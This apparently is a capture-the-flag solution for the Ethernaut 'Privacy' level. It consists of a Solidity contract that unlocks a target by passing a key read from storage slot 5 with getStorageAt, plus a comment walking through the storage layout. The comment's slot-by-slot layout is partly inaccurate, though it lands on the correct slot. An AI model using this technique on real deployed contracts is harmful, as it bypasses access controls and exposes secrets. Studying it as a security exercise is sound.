// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Privacy.sol';

contract HackPrivacy {
    // Complete with the instance's address
    Privacy public originalContract = Privacy(0x550945DBEBd70Fb4afD2c64476d7Dd9B99FA20dB);

    function hack(bytes32 pass) public {
        originalContract.unlock(bytes16(pass));
    }
}

/*
    The first thing you need to do is to go throw the storage until you find the key
    This way you're going to find the key in a bytes32 format
    -await web3.eth.getStorageAt(instance, 5, console.log)

    Why slot 5 of the storage?
    Well, in the slot 0 you're gonna find the boolean locked
    Into the slot 1 you're gonna find the two uint8
    Into the slot 2 you're gonna find the uint16

    The array of bytes32 has a length of 3, and we need the third one.
    Why the third one? Because the key is created from the bytes32 in the position 2 of the array.
    The positions starts at 0, so the third one is at position 2.

    Into the slot 3 you're gonna find the first bytes32
    Into the slot 4 you're gonna find the second bytes32
    Into the slot 5 you're gonna find the third bytes32

    Pass the slot 5 as key and you're gonna complete the level

*/
